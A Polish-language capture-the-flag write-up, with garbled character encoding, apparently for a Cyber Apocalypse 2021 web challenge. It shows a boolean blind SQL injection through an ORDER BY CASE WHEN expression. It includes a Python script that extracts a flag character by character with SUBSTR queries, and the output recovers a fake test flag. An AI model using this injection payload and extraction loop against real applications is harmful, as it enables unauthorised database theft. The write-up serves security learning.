---
≈πr√≥d≈Ço: https://nosecurity.blog/cyberApocalypse2021
---

# WyglƒÖd platformy

![platforma](./platform.png)

# Logika Blind SQLi

```sql
(CASE WHEN (1=1) THEN id ELSE count END)
```

`{'id': 1, 'emoji': 'üëΩ', 'name': 'alien', 'count': 13}`

```sql
(CASE WHEN (1=2) THEN id ELSE count END)
```

`{'id': 3, 'emoji': 'üëæ', 'name': 'alien monster', 'count': 0}`

```python
finished = False
# atak si≈Çowy zaczynamy od 1 znaku 
# SQL jako pierwszy indeks bierze 1
character_position = 1
# Starting with a blank string and then appending characters to it as we bruteforce
flag = ''

while not finished:
    for character in bruteforce_alphabet:

        sql_payload = '(CASE WHEN (SELECT SUBSTR(' + sql_field + ',1,' + str(character_position) + ') FROM ' + sql_table + sql_where + ')=\'' + flag + character + '\' THEN id ELSE count END);--'
        
        request = send_order_query(sql_payload)
		
        # jak znajdziemy znak to szukaj kolejnego
        if blind_boolean(request):
            flag += character
            character_position += 1
            print('Hit: ' + flag)
            break
		
        # jak dojdziemy do ko≈Ñca alfabetu to znaczy, ≈ºe przeszli≈õmy wszystko
        if character == bruteforce_alphabet[-1]:
            finished = True
```

# 1. 
```sql
SUBSTR(' + sql_field + ',1,' + str(character_position) + ')
```
> wybierz znak na indeksie character_position z pola sql_field

# 2.
```sql
(SELECT 
    SUBSTR(' + sql_field + ',1,' + str(character_position) + ') 
FROM ' + sql_table + sql_where + ')
```
> we≈∫ znak z **1.** i przeka≈º do zapytania z **3.**

# 3.
```sql
(CASE WHEN 
    (SELECT SUBSTR(' + sql_field + ',1,' + str(character_position) + ') FROM ' + sql_table + sql_where + ')=\'' + flag + character + '\' 
THEN id ELSE count END);--
```
>je≈õli wybrany znak odpowiada temu w bazie to wybierz wed≈Çug **id**
> w przeciwnym przypadku wybierz wed≈Çug **count**



# Wynik
```
...
Hit: CHTB{f4k3_fl4g_f0r_t3s
Hit: CHTB{f4k3_fl4g_f0r_t3st
Hit: CHTB{f4k3_fl4g_f0r_t3st1
Hit: CHTB{f4k3_fl4g_f0r_t3st1n
Hit: CHTB{f4k3_fl4g_f0r_t3st1ng
Hit: CHTB{f4k3_fl4g_f0r_t3st1ng}
```